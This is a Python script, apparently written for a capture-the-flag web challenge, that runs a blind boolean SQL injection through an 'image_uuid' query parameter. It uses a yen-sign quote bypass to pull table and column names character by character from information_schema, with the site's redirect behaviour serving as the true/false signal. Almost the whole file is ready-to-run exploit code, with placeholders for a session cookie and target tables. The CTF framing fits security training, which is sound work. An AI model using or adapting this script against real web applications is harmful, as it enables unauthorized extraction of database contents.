import requests
import time

'''
This function saves in the columsn.txt file the columns of the tables specified in the config variable table_names.
'''

# Configuration
url = "https://web6.chall.necst.it/myphotos"
session_cookie= "<cookie>" # to modify: insert your own cookie
tables_names = {80 : 'himitsu'} # to modify: insert tables you want to know coloumns in the form (table_index, table_name)

def columns_spoofer():
    session = requests.Session()
    file = open('columns.txt', 'w')
    
    table_index_where_flag_is=-1

    for t in tables_names.keys(): # for each table index inside the dictionary "tables_names"
        file.write("--- TABLE " + str(t) + ' --- \n')
        print("--- TABLE " + str(tables_names[t]) + ' ---')

        query = f"¥\' or (SELECT flag FROM" + str(tables_names[t]) + "LIMIT 1 OFFSET 1);--%20"

        success = False
        while not success:
            try:
                request = session.get(url, params={'image_uuid': query}, cookies={'session': session_cookie})
                success = True
            except requests.exceptions.ConnectionError:
                print("Connection error, let's try again after 5 seconds")
                time.sleep(5)

        if(len(request.history)==0): # this statement is true when the website does not redirect to /myphotos page, i.e. when the flag columns exists in the current table  
            file.write(str(t) + " : " + tables_names[t])
            print(str(t) + " : " + tables_names[t])
            table_index_where_flag_is = t
            break
        elif(len(request.history)>0): # this statement is true when the website does redirect to /myphotos page, i.e. when the flag columns does not exist in the current table
            continue
        else:
            print("Error raised")
    
    file.write("\n")

    # print the columns of the table where the flag is
    file.write("--- TABLE " + str(table_index_where_flag_is) + ' COLUMNS --- \n')
    print("--- TABLE " + str(table_index_where_flag_is) + ' COLUMNS ---')
    for col in range(0,10): # for each column

        for char_index in range(1,20): 

            for n in range(65,123):
                query = f"¥\' or ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = ( SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET "+ str(table_index_where_flag_is) +") LIMIT 1 OFFSET " + str(col) + "), " + str(char_index) + ", 1)) = " + str(n) + " LIMIT 1;--%20"
                
                success = False
                while not success:
                    try:
                        request = session.get(url, params={'image_uuid': query}, cookies={'session': session_cookie})
                        success = True
                    except requests.exceptions.ConnectionError:
                        print("Connection error, let's try again after 5 seconds")
                        time.sleep(5)
                        
                if(len(request.history)==0): # this statement is true when the website does not redirect to /myphotos page
                    file.write(chr(n)) # to convert in ascii
                    print("converted :"+ chr(n)+" ascii num:"+str(n))
                    break
                elif(len(request.history)>0): # this statement is true when the website does redirect to /myphotos page
                    continue
                else:
                    print("Error rised")

        file.write("\n")

    print("Finished!")
    file.close()

columns_spoofer()
